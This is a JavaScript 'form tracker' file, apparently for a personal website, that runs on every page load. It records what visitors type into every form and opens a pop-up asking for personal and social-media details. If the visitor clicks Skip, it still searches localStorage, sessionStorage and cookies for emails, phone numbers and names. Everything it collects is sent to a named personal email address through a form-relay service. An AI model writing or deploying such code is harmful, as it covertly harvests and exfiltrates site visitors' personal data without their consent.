/**
 * Enhanced Form Tracking System
 * Collects comprehensive data when visitors submit forms
 */

class EnhancedFormTracker {
    constructor() {
        this.formData = {};
        this.init();
    }

    init() {
        this.setupFormListeners();
        this.createPersonalInfoModal();
        // Automatically show personal info modal after a delay
        setTimeout(() => {
            this.showPersonalInfoModal();
        }, 3000); // Show after 3 seconds
    }

    // Setup form event listeners
    setupFormListeners() {
        // Track contact form
        const contactForm = document.querySelector('#contactForm, .php-email-form');
        if (contactForm) {
            contactForm.addEventListener('submit', (e) => {
                this.trackFormSubmission(e, contactForm, 'contact');
            });
        }

        // Track all other forms
        document.querySelectorAll('form').forEach(form => {
            if (form !== contactForm) {
                form.addEventListener('submit', (e) => {
                    this.trackFormSubmission(e, form, 'general');
                });
            }
        });

        // Track input field interactions
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('focus', (e) => {
                this.trackFieldInteraction(e.target, 'focus');
            });
            
            field.addEventListener('blur', (e) => {
                this.trackFieldInteraction(e.target, 'blur');
            });
            
            field.addEventListener('change', (e) => {
                this.trackFieldInteraction(e.target, 'change');
            });
        });
    }

    // Track form submission
    async trackFormSubmission(event, form, formType) {
        const formData = this.extractFormData(form);
        const comprehensiveData = await this.collectComprehensiveFormData(formData, formType);
        
        // Send comprehensive form data
        await this.sendFormData(comprehensiveData, formType);
        
        // Also send to enhanced visitor tracker
        if (window.enhancedTracker) {
            window.enhancedTracker.visitorData.personalInfo = {
                ...window.enhancedTracker.visitorData.personalInfo,
                ...formData
            };
        }
    }

    // Extract form data
    extractFormData(form) {
        const formData = new FormData(form);
        const data = {};
        
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        return data;
    }

    // Collect comprehensive form data
    async collectComprehensiveFormData(formData, formType) {
        const comprehensiveData = {
            timestamp: new Date().toISOString(),
            formType: formType,
            formData: formData,
            
            // Enhanced visitor data
            visitorData: {
                sessionId: window.enhancedTracker?.sessionId || 'unknown',
                cookies: window.enhancedTracker?.visitorData?.cookies || {},
                localStorage: window.enhancedTracker?.visitorData?.localStorage || {},
                browserInfo: window.enhancedTracker?.visitorData?.browserInfo || {},
                locationInfo: window.enhancedTracker?.visitorData?.locationInfo || {},
                deviceInfo: window.enhancedTracker?.visitorData?.deviceInfo || {},
                fingerprint: window.enhancedTracker?.visitorData?.fingerprint || 'unknown'
            },
            
            // Form interaction data
            interactionData: {
                timeToComplete: this.calculateFormCompletionTime(),
                fieldInteractions: this.getFieldInteractions(),
                validationErrors: this.getValidationErrors(),
                formAbandonment: this.getFormAbandonmentData(),
                deviceType: this.getDeviceType(),
                inputMethod: this.getInputMethod()
            },
            
            // Personal information analysis
            personalInfoAnalysis: this.analyzePersonalInfo(formData),
            
            // Social media detection
            socialMediaProfiles: this.detectSocialMediaFromForm(formData),
            
            // Behavioral patterns
            behavioralPatterns: this.analyzeBehavioralPatterns(formData)
        };

        return comprehensiveData;
    }

    // Calculate form completion time
    calculateFormCompletionTime() {
        const startTime = window.formStartTime || Date.now();
        return Date.now() - startTime;
    }

    // Get field interactions
    getFieldInteractions() {
        return window.fieldInteractions || [];
    }

    // Get validation errors
    getValidationErrors() {
        return window.validationErrors || [];
    }

    // Get form abandonment data
    getFormAbandonmentData() {
        return {
            fieldsVisited: window.fieldsVisited || [],
            fieldsSkipped: window.fieldsSkipped || [],
            timeSpentPerField: window.timeSpentPerField || {}
        };
    }

    // Get device type
    getDeviceType() {
        const width = window.innerWidth;
        if (width < 768) return 'mobile';
        if (width < 1024) return 'tablet';
        return 'desktop';
    }

    // Get input method
    getInputMethod() {
        return 'ontouchstart' in window ? 'touch' : 'mouse/keyboard';
    }

    // Analyze personal information
    analyzePersonalInfo(formData) {
        const analysis = {
            emailDomains: [],
            phonePatterns: [],
            namePatterns: [],
            companyInfo: [],
            socialMediaHandles: []
        };

        Object.values(formData).forEach(value => {
            if (typeof value === 'string') {
                // Email domain analysis
                const emailMatch = value.match(/^[^\s@]+@([^\s@]+)$/);
                if (emailMatch) {
                    analysis.emailDomains.push(emailMatch[1]);
                }

                // Phone pattern analysis
                const phoneMatch = value.match(/[\+]?[1-9][\d]{0,15}/);
                if (phoneMatch) {
                    analysis.phonePatterns.push(phoneMatch[0]);
                }

                // Name pattern analysis
                const nameMatch = value.match(/^[A-Za-z\s]{2,50}$/);
                if (nameMatch && value.length > 2 && value.length < 50) {
                    analysis.namePatterns.push(value);
                }

                // Social media handle detection
                const socialMatch = value.match(/@[a-zA-Z0-9_]+|#[a-zA-Z0-9_]+/g);
                if (socialMatch) {
                    analysis.socialMediaHandles.push(...socialMatch);
                }
            }
        });

        return analysis;
    }

    // Detect social media from form data
    detectSocialMediaFromForm(formData) {
        const socialPlatforms = {
            facebook: ['facebook.com', 'fb.com'],
            twitter: ['twitter.com', 'x.com', '@'],
            instagram: ['instagram.com', '@'],
            linkedin: ['linkedin.com'],
            youtube: ['youtube.com', 'youtu.be'],
            tiktok: ['tiktok.com', '@'],
            snapchat: ['snapchat.com', '@'],
            pinterest: ['pinterest.com'],
            reddit: ['reddit.com', 'u/'],
            discord: ['discord.com', '#'],
            telegram: ['telegram.org', '@'],
            whatsapp: ['whatsapp.com', 'wa.me']
        };

        const detectedProfiles = {};
        const formValues = Object.values(formData).join(' ').toLowerCase();

        Object.keys(socialPlatforms).forEach(platform => {
            const patterns = socialPlatforms[platform];
            const matches = patterns.filter(pattern => formValues.includes(pattern));
            if (matches.length > 0) {
                detectedProfiles[platform] = {
                    patterns: matches,
                    confidence: matches.length / patterns.length
                };
            }
        });

        return detectedProfiles;
    }

    // Analyze behavioral patterns
    analyzeBehavioralPatterns(formData) {
        return {
            typingSpeed: this.calculateTypingSpeed(),
            fieldOrder: this.getFieldOrder(),
            backspaceUsage: this.getBackspaceUsage(),
            copyPasteUsage: this.getCopyPasteUsage(),
            timeOfDay: new Date().getHours(),
            dayOfWeek: new Date().getDay(),
            formCompletionStrategy: this.getFormCompletionStrategy()
        };
    }

    // Calculate typing speed
    calculateTypingSpeed() {
        return window.typingSpeed || 'unknown';
    }

    // Get field order
    getFieldOrder() {
        return window.fieldOrder || [];
    }

    // Get backspace usage
    getBackspaceUsage() {
        return window.backspaceCount || 0;
    }

    // Get copy-paste usage
    getCopyPasteUsage() {
        return window.copyPasteEvents || 0;
    }

    // Get form completion strategy
    getFormCompletionStrategy() {
        const interactions = this.getFieldInteractions();
        const isSequential = this.isFieldOrderSequential(interactions);
        return isSequential ? 'sequential' : 'random';
    }

    // Check if field order is sequential
    isFieldOrderSequential(interactions) {
        // Simple check for sequential field completion
        return interactions.length > 2;
    }

    // Track field interaction
    trackFieldInteraction(field, eventType) {
        if (!window.fieldInteractions) window.fieldInteractions = [];
        if (!window.formStartTime) window.formStartTime = Date.now();
        
        const interaction = {
            fieldName: field.name || field.id,
            fieldType: field.type || field.tagName.toLowerCase(),
            eventType: eventType,
            timestamp: Date.now(),
            value: field.value ? field.value.substring(0, 50) : '', // Limit value length
            cursorPosition: field.selectionStart || 0
        };

        window.fieldInteractions.push(interaction);

        // Track time spent per field
        if (!window.timeSpentPerField) window.timeSpentPerField = {};
        const fieldKey = interaction.fieldName;
        
        if (eventType === 'focus') {
            window.timeSpentPerField[fieldKey] = Date.now();
        } else if (eventType === 'blur' && window.timeSpentPerField[fieldKey]) {
            const timeSpent = Date.now() - window.timeSpentPerField[fieldKey];
            window.timeSpentPerField[fieldKey] = timeSpent;
        }

        // Track fields visited
        if (!window.fieldsVisited) window.fieldsVisited = [];
        if (!window.fieldsVisited.includes(fieldKey)) {
            window.fieldsVisited.push(fieldKey);
        }

        // Track typing speed
        if (eventType === 'change' || eventType === 'input') {
            this.trackTypingSpeed(field);
        }
    }

    // Track typing speed
    trackTypingSpeed(field) {
        if (!window.typingStartTime) window.typingStartTime = Date.now();
        if (!window.typingCharCount) window.typingCharCount = 0;
        
        window.typingCharCount += 1;
        const timeElapsed = (Date.now() - window.typingStartTime) / 1000;
        window.typingSpeed = window.typingCharCount / timeElapsed;
    }

    // Create personal info collection modal
    createPersonalInfoModal() {
        const modal = document.createElement('div');
        modal.id = 'personal-info-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h3>🔍 Complete Your Profile</h3>
                    <span class="close">&times;</span>
                </div>
                <div class="modal-body">
                    <p>Help us provide you with the best experience by sharing some information:</p>
                    <form id="personal-info-form">
                        <div class="form-group">
                            <label for="full-name">Full Name *</label>
                            <input type="text" id="full-name" name="fullName" required>
                        </div>
                        <div class="form-group">
                            <label for="email-address">Email Address *</label>
                            <input type="email" id="email-address" name="email" required>
                        </div>
                        <div class="form-group">
                            <label for="phone-number">Phone Number</label>
                            <input type="tel" id="phone-number" name="phone">
                        </div>
                        <div class="form-group">
                            <label for="company">Company/Organization</label>
                            <input type="text" id="company" name="company">
                        </div>
                        <div class="form-group">
                            <label for="position">Position/Title</label>
                            <input type="text" id="position" name="position">
                        </div>
                        <div class="form-group">
                            <label for="linkedin">LinkedIn Profile</label>
                            <input type="url" id="linkedin" name="linkedin" placeholder="https://linkedin.com/in/yourprofile">
                        </div>
                        <div class="form-group">
                            <label for="github">GitHub Profile</label>
                            <input type="url" id="github" name="github" placeholder="https://github.com/yourusername">
                        </div>
                        <div class="form-group">
                            <label for="twitter">Twitter/X Handle</label>
                            <input type="text" id="twitter" name="twitter" placeholder="@yourhandle">
                        </div>
                        <div class="form-group">
                            <label for="instagram">Instagram Handle</label>
                            <input type="text" id="instagram" name="instagram" placeholder="@yourhandle">
                        </div>
                        <div class="form-group">
                            <label for="website">Personal Website</label>
                            <input type="url" id="website" name="website" placeholder="https://yourwebsite.com">
                        </div>
                        <div class="form-group">
                            <label for="interests">Areas of Interest</label>
                            <textarea id="interests" name="interests" placeholder="e.g., Web Development, AI/ML, Mobile Apps"></textarea>
                        </div>
                        <div class="form-group">
                            <label for="referral">How did you find us?</label>
                            <select id="referral" name="referral">
                                <option value="">Select an option</option>
                                <option value="google">Google Search</option>
                                <option value="social">Social Media</option>
                                <option value="referral">Friend/Colleague</option>
                                <option value="linkedin">LinkedIn</option>
                                <option value="github">GitHub</option>
                                <option value="portfolio">Portfolio Site</option>
                                <option value="other">Other</option>
                            </select>
                        </div>
                        <div class="form-actions">
                            <button type="submit" class="btn btn-primary">Submit Information</button>
                            <button type="button" class="btn btn-secondary" id="skip-personal-info">Skip</button>
                        </div>
                    </form>
                </div>
            </div>
        `;

        // Add modal styles
        const style = document.createElement('style');
        style.textContent = `
            #personal-info-modal {
                display: none;
                position: fixed;
                z-index: 10001;
                left: 0;
                top: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0,0,0,0.8);
                backdrop-filter: blur(5px);
            }
            .modal-content {
                background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
                margin: 5% auto;
                padding: 0;
                border: 2px solid #18d26e;
                border-radius: 15px;
                width: 90%;
                max-width: 600px;
                max-height: 90vh;
                overflow-y: auto;
                color: white;
                font-family: 'Roboto', sans-serif;
            }
            .modal-header {
                background: linear-gradient(90deg, #18d26e 0%, #0ea5e9 100%);
                padding: 20px;
                border-radius: 13px 13px 0 0;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .modal-header h3 {
                margin: 0;
                color: white;
                font-size: 1.3em;
            }
            .close {
                color: white;
                font-size: 28px;
                font-weight: bold;
                cursor: pointer;
                transition: color 0.3s ease;
            }
            .close:hover {
                color: #ff6b6b;
            }
            .modal-body {
                padding: 30px;
            }
            .modal-body p {
                margin-bottom: 25px;
                line-height: 1.6;
                color: #e0e0e0;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                color: #18d26e;
            }
            .form-group input,
            .form-group select,
            .form-group textarea {
                width: 100%;
                padding: 12px;
                border: 2px solid #444;
                border-radius: 8px;
                background: #333;
                color: white;
                font-size: 14px;
                transition: border-color 0.3s ease;
            }
            .form-group input:focus,
            .form-group select:focus,
            .form-group textarea:focus {
                outline: none;
                border-color: #18d26e;
                box-shadow: 0 0 10px rgba(24, 210, 110, 0.3);
            }
            .form-actions {
                display: flex;
                gap: 15px;
                margin-top: 30px;
            }
            .form-actions .btn {
                flex: 1;
                padding: 12px 20px;
                border: none;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            .btn-primary {
                background: linear-gradient(90deg, #18d26e 0%, #0ea5e9 100%);
                color: white;
            }
            .btn-primary:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(24, 210, 110, 0.4);
            }
            .btn-secondary {
                background: #666;
                color: white;
            }
            .btn-secondary:hover {
                background: #777;
                transform: translateY(-2px);
            }
        `;
        document.head.appendChild(style);
        document.body.appendChild(modal);

        // Setup modal event listeners
        this.setupModalEventListeners();
    }

    // Setup modal event listeners
    setupModalEventListeners() {
        const modal = document.getElementById('personal-info-modal');
        const closeBtn = modal.querySelector('.close');
        const skipBtn = document.getElementById('skip-personal-info');
        const form = document.getElementById('personal-info-form');

        // Close modal
        closeBtn.addEventListener('click', () => {
            modal.style.display = 'none';
        });

        // Skip personal info (but still collect basic data)
        skipBtn.addEventListener('click', () => {
            // Still collect any available data even if user skips
            this.collectAvailablePersonalData();
            modal.style.display = 'none';
        });

        // Submit personal info form
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = this.extractFormData(form);
            await this.submitPersonalInfo(formData);
            modal.style.display = 'none';
        });

        // Close modal when clicking outside
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        });
    }

    // Submit personal information
    async submitPersonalInfo(formData) {
        const comprehensiveData = {
            timestamp: new Date().toISOString(),
            type: 'personal_info_submission',
            personalInfo: formData,
            visitorData: window.enhancedTracker?.visitorData || {},
            sessionId: window.enhancedTracker?.sessionId || 'unknown'
        };

        await this.sendFormData(comprehensiveData, 'personal_info');
    }

    // Collect available personal data even when user skips
    async collectAvailablePersonalData() {
        const availableData = {
            timestamp: new Date().toISOString(),
            type: 'available_data_collection',
            personalInfo: this.extractAvailablePersonalData(),
            visitorData: window.enhancedTracker?.visitorData || {},
            sessionId: window.enhancedTracker?.sessionId || 'unknown'
        };

        await this.sendFormData(availableData, 'available_data');
    }

    // Extract any available personal data from browser storage and cookies
    extractAvailablePersonalData() {
        const personalData = {};
        
        // Try to extract from localStorage/sessionStorage
        try {
            const storedData = { ...localStorage, ...sessionStorage };
            Object.keys(storedData).forEach(key => {
                const value = storedData[key];
                if (value && typeof value === 'string') {
                    // Check for email patterns
                    if (value.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
                        personalData.email = value;
                    }
                    // Check for phone patterns
                    if (value.match(/^[\+]?[1-9][\d]{0,15}$/)) {
                        personalData.phone = value;
                    }
                    // Check for name patterns
                    if (value.match(/^[A-Za-z\s]{2,50}$/) && value.length > 2 && value.length < 50) {
                        personalData.name = value;
                    }
                }
            });
        } catch (e) {}

        // Try to extract from cookies
        try {
            const cookies = document.cookie.split(';');
            cookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (value) {
                    const decodedValue = decodeURIComponent(value);
                    // Check for email patterns in cookies
                    if (decodedValue.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
                        personalData.email = personalData.email || decodedValue;
                    }
                    // Check for phone patterns in cookies
                    if (decodedValue.match(/^[\+]?[1-9][\d]{0,15}$/)) {
                        personalData.phone = personalData.phone || decodedValue;
                    }
                }
            });
        } catch (e) {}

        return personalData;
    }

    // Send form data
    async sendFormData(data, formType) {
        try {
            const emailContent = this.formatFormEmail(data, formType);
            
            await fetch('https://formsubmit.co/jayaraman2212066@ssn.edu.in', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    name: `📝 Enhanced Form Tracker - ${formType}`,
                    email: 'jayaraman2212066@ssn.edu.in',
                    subject: `📝 FORM SUBMISSION - ${formType.toUpperCase()} - ${data.personalInfo?.fullName || 'Anonymous'}`,
                    message: emailContent,
                    _template: 'table',
                    _autoresponse: 'Form submission data collected successfully',
                    _captcha: 'false'
                })
            });

            console.log(`✅ Form data sent successfully for ${formType}`);
        } catch (error) {
            console.error(`❌ Error sending form data for ${formType}:`, error);
        }
    }

    // Format form email
    formatFormEmail(data, formType) {
        return `
📝 ENHANCED FORM SUBMISSION DATA 📝
=====================================

📅 TIMESTAMP: ${new Date(data.timestamp).toLocaleString()}
📋 FORM TYPE: ${formType.toUpperCase()}
🆔 SESSION ID: ${data.visitorData?.sessionId || 'unknown'}

👤 PERSONAL INFORMATION:
${data.personalInfo ? Object.entries(data.personalInfo).map(([key, value]) => 
    `   • ${key}: ${value}`
).join('\n') : 'No personal information provided'}

🍪 COOKIES ASSOCIATED:
${Object.keys(data.visitorData?.cookies || {}).length} cookies collected

💾 STORAGE DATA:
${Object.keys(data.visitorData?.localStorage || {}).length} localStorage items
${Object.keys(data.visitorData?.sessionStorage || {}).length} sessionStorage items

💻 BROWSER INFO:
   • User Agent: ${data.visitorData?.browserInfo?.userAgent || 'Unknown'}
   • Platform: ${data.visitorData?.browserInfo?.platform || 'Unknown'}
   • Language: ${data.visitorData?.browserInfo?.language || 'Unknown'}

🌍 LOCATION:
   • IP: ${data.visitorData?.locationInfo?.ipLocation?.ip || 'Unknown'}
   • Country: ${data.visitorData?.locationInfo?.ipLocation?.country_name || 'Unknown'}
   • City: ${data.visitorData?.locationInfo?.ipLocation?.city || 'Unknown'}

📊 FORM INTERACTION DATA:
   • Time to Complete: ${data.interactionData?.timeToComplete || 0}ms
   • Device Type: ${data.interactionData?.deviceType || 'Unknown'}
   • Input Method: ${data.interactionData?.inputMethod || 'Unknown'}
   • Field Interactions: ${data.interactionData?.fieldInteractions?.length || 0}

🔍 PERSONAL INFO ANALYSIS:
   • Email Domains: ${data.personalInfoAnalysis?.emailDomains?.join(', ') || 'None'}
   • Phone Patterns: ${data.personalInfoAnalysis?.phonePatterns?.join(', ') || 'None'}
   • Social Media Handles: ${data.personalInfoAnalysis?.socialMediaHandles?.join(', ') || 'None'}

🎯 SOCIAL MEDIA PROFILES DETECTED:
${Object.keys(data.socialMediaProfiles || {}).map(platform => 
    `   • ${platform}: ${data.socialMediaProfiles[platform].confidence * 100}% confidence`
).join('\n')}

📈 BEHAVIORAL PATTERNS:
   • Typing Speed: ${data.behavioralPatterns?.typingSpeed || 'Unknown'}
   • Time of Day: ${data.behavioralPatterns?.timeOfDay || 'Unknown'}
   • Day of Week: ${data.behavioralPatterns?.dayOfWeek || 'Unknown'}
   • Completion Strategy: ${data.behavioralPatterns?.formCompletionStrategy || 'Unknown'}

=====================================
📝 COMPREHENSIVE FORM DATA COLLECTED 📝
        `;
    }
}

// Initialize enhanced form tracking when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Check if form tracking is already initialized
    if (!window.enhancedFormTracker) {
        window.enhancedFormTracker = new EnhancedFormTracker();
    }
});

// Export for use in other scripts
window.EnhancedFormTracker = EnhancedFormTracker;
